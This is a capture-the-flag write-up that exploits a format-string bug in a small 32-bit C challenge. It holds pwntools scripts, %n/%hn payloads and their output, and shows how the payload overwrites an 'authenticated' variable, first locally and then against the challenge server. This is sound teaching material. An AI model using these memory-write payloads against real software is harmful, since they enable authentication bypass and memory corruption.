# fmt write

## Description

> Try to write something.

## Write-Up

Let's try to analyse the given `C` code :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NAME_LEN 50

// gcc -m32 -o chall source.c

void disable_buffering() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}

int main(void) {
    
    disable_buffering();

    int authenticated = 0;
    printf("This may help later : 0x%x\n", &authenticated);

    char name[NAME_LEN];
    
    printf("Name : ");
    fgets(name, NAME_LEN, stdin);
    
    printf("Hi, ");
    printf(name);

    printf("[authenticated] = %d\n", authenticated);

    if (authenticated == 1)
        printf("shellmates{XXXXXXXXXXXXXXXXXXXXX}\n");
    else 
        printf("Nope! You won't be getting any flags\n");

    return 0;
}
```

At first, we can clearly see that this program has a **Format String Vulnerability** :

```c
...
    printf("Name : ");
    fgets(name, NAME_LEN, stdin);
    
    printf("Hi, ");
    printf(name);
...
```

But this time, in order to get the flag, we will need to not leak the stack (since the flag is not stored by directly printed from the code) but to actually **Write** in it in order to change the value of `authenticated` variable so we can bypass the authentification condition :


```c
...
    int authenticated = 0;
...
    printf("[authenticated] = %d\n", authenticated);

    if (authenticated == 1)
        printf("shellmates{XXXXXXXXXXXXXXXXXXXXX}\n");
...
```

To do that, there is a special format specifier to use, which is the `%n` specifier.

> The format string vulnerability can be used to **read** or **write** memory and/or execute harmful code. 
>
> According to the printf() man page, here is what %n should do :
>
>  - *The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.*
> 
> `printf` cannot write anywhere without using the `%n` format specifier. This is the one you're missing. Something like `%.987654d%n` will write the number `987654` (the number of characters output so far) to an address specified by the second argument, where the first argument is an int. This should be enough to get you started.

Hum, It’s a bit cryptic… Basically, it means that %n will write the size of our input at the address pointed by `%n`. For example, the following input : `AAAA%n`, means that we will write the value 4 (because the size of “AAAA” equals 4) at the address pointed by `%n`. But, where on the stack `%n` points to ? Well it actually points to the first pointer on top of the stack. So, we can only change the value of the first address ?

To solve the challenge, you have to remember 2 things :

 - You control the input
 - We can specify a postion to read/write on the stack with `%<num>$n`

So, instead of using a simple %n, we can use `%<num>$n` to specify the address to write to. What would happens if `%<num>$n` points to the start of our string ? Well, it will use the address specified in the beggining of our strings to write data to.

Let's try it out using the following script (Note the payload format to target the address of the `authenticated` value) :

```py
#! /usr/bin/python3

from pwn import *

HOST = ''
PORT = ''

p = process('./chall')
address = p.recv().split()[5]
print(str(address)[2:-1])
addressBytesInStack = p32(int(str(address)[2:-1], 16))

p.sendline(b'AA' + addressBytesInStack + b'%7$hn')

p.interactive()
```

And of course, we can try varianes of payload :

```py
p.sendline(b'A ' + addressBytesInStack + b'%7$n')
```


```
[+] Starting local process './chall': pid 89759
0xff8bbbac
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 89759)
Hi, A \xac\xbb\x8b\xff
[authenticated] = 6
Nope! You won't be getting any flags
[*] Got EOF while reading in interactive
```

```py
p.sendline(b'A ' + addressBytesInStack + b'%p %p %p %p %p %p %p %p %p %p %p %p %7$n')
```

```
[+] Starting local process './chall': pid 90097
0xff9af82c
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 90097)
Hi, A ,\xf8\x9a\xff0x32 0xf7e1d620 0x5660e239 0xf7fdfff4 0x2c 0x20410000 0xff9af82c 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 
[authenticated] = 126
Nope! You won't be getting any flags
```

```py
p.sendline(b'A ' + addressBytesInStack + b'%p %p %p %p %p %p %p %p %p %p %7$n')
```

```
[+] Starting local process './chall': pid 90711
0xffbbf94c
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 90711)
Hi, A L\xf9\xbb\xff0x32 0xf7e1d620 0x565e1239 0xf7f94ff4 0x2c 0x20410000 0xffbbf94c 0x25207025 0x70252070 0x20702520 
[authenticated] = 104
Nope! You won't be getting any flags
[*] Got EOF while reading in interactive
```

```py
p.sendline(b'A ' + addressBytesInStack + b'%p %p %p %p %p %p %p %p %7$n')
```

```
[+] Starting local process './chall': pid 90887
0xffa16cdc
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 90887)
Hi, A \xdcl\xa1\xff0x32 0xf7e1d620 0x565ea239 0xf7ff4ff4 0x2c 0x20410000 0xffa16cdc 0x25207025 
[authenticated] = 82
Nope! You won't be getting any flags
[*] Got EOF while reading in interactive
```

```py
p.sendline(b'A%' + addressBytesInStack + b'%7$n')
```

```
[+] Starting local process './chall': pid 92874
0xffcde34c
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 92874)
Hi, A%\xe3\xcd\xff
[authenticated] = 5
Nope! You won't be getting any flags
[*] Got EOF while reading in interactive
```

As you can see, we are actually modifying the `authenticated` value, but since there is only `%n`, so, the program will take directly 4 bytes, calculate the length, then write it back in the correspondante address. In order to make it consider less bytes, we use `%hn`, with `%2x` to specify the number of bytes we want :

```py
p.sendline(b'AA' + addressBytesInStack + b'%2x%7$hn')
```

```
[+] Starting local process './chall': pid 98734
0xff9c946c
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 98734)
Hi, AAl\x94\x9c\xff32
[authenticated] = 8
Nope! You won't be getting any flags
```

Now, comes the tricky part : since we are manipulating two bytes, we need to pass in a padding (the first part of the payload like we used in first examples `AA`) by manipulating the value in the `%2x` in order to accept only two bytes that have the length of 1.

However, as we make that value `%2x` grop up, we can see that the authenticated grow with it as well :

```py
p.sendline(b'AA' + addressBytesInStack + b'%3x%7$hn')
```

```
[+] Starting local process './chall': pid 100626
0xffe3a4bc
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 100626)
Hi, AA\xbc\xa4\xe3\xff 32
[authenticated] = 9
Nope! You won't be getting any flags
```

```py
p.sendline(b'AA' + addressBytesInStack + b'%4x%7$hn')
```

```
[+] Starting local process './chall': pid 100518
0xffe2af0c
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 100518)
Hi, AA\x0c\xe2\xff  32
[authenticated] = 10
Nope! You won't be getting any flags
[*] Got EOF while reading in interactive
```

...

```py
p.sendline(b'AA' + addressBytesInStack + b'%1000x%7$hn')
```


```
[+] Starting local process './chall': pid 101455
0xffc8c97c
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 101455)
Hi, AA|\xc9\xc8\xff                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      32
[authenticated] = 1006
Nope! You won't be getting any flags
[*] Got EOF while reading in interactive
```

...

Without forgetting that we are taking only 2 bytes from the input value, we can grow the value big enough so it has its first two bytes with the length of 1, for example until `0x10001`, since it will take only `0x1000`, like a modulus effect.

**Note :** Since we can't use `0x01` because it is giving us `4-5` as values for the `authenticated` value, we need to grow our padding to a number where its two first bytes have only the length of 1, for example `0x10001` (Note that the value depends on how the stack actually store the data, from top to bottom). So, writing `0x10001` with hn => writing 1 in the `authenticated`


To be more efficient, let's try to directly calculate it :

 - We have that 0x10001 = 65537
 - And since 2 => 8 in the `authenticated`
 - Then 65531 => 65537 in the `authenticated` => 1 in the `authenticated`

Our script becomes :

```py
#! /usr/bin/python3

from pwn import *

HOST = ''
PORT = ''

p = process('./chall')
address = p.recv().split()[5]
print(str(address)[2:-1])
addressBytesInStack = p32(int(str(address)[2:-1], 16))

p.sendline(b'AA' + addressBytesInStack + b'%65531x%7$hn')

p.interactive()
```

After execution :

```
[+] Starting local process './chall': pid 101455
0xffc8c97c
[*] Switching to interactive mode
[*] Process './chall' stopped with exit code 0 (pid 101455)
Hi, AA|\xc9\xc8\xff  


    32
[authenticated] = 1
shellmates{XXXXXXXXXXXXXXXXXXXXX}
[*] Got EOF while reading in interactive
```


in remote :

```py
#! /usr/bin/python3

from pwn import *

HOST = 'pwn.challs.ctf.shellmates.club'
PORT = '1404'

p = remote(HOST, PORT)
address = p.recv().split()[5]
print(str(address)[2:-1])
addressBytesInStack = p32(int(str(address)[2:-1], 16))

p.sendline(b'AA' + addressBytesInStack + b'%65531x%7$hn')

p.interactive()
```

```
[+] Opening connection to pwn.challs.ctf.shellmates.club on port 1404: Done
0xff921dfc
[*] Switching to interactive mode
Hi, AA\xfc\x92\xff
                    32
[authenticated] = 1
shellmates{Fmt_str1nG_CAN_WRItE_tO0}
[*] Got EOF while reading in interactive
```

## Flag

shellmates{Fmt_str1nG_CAN_WRItE_tO0}

## More Information

 - How to Write Specific Values to Memory with Format String Exploitation  : https://null-byte.wonderhowto.com/how-to/exploit-development-write-specific-values-memory-with-format-string-exploitation-0182112/
 - How to write value into an address in format string attack : https://stackoverflow.com/questions/4855162/how-to-write-value-into-an-address-in-format-string-attack
 - Exploit 101 - Format Strings  : https://axcheron.github.io/exploit-101-format-strings/
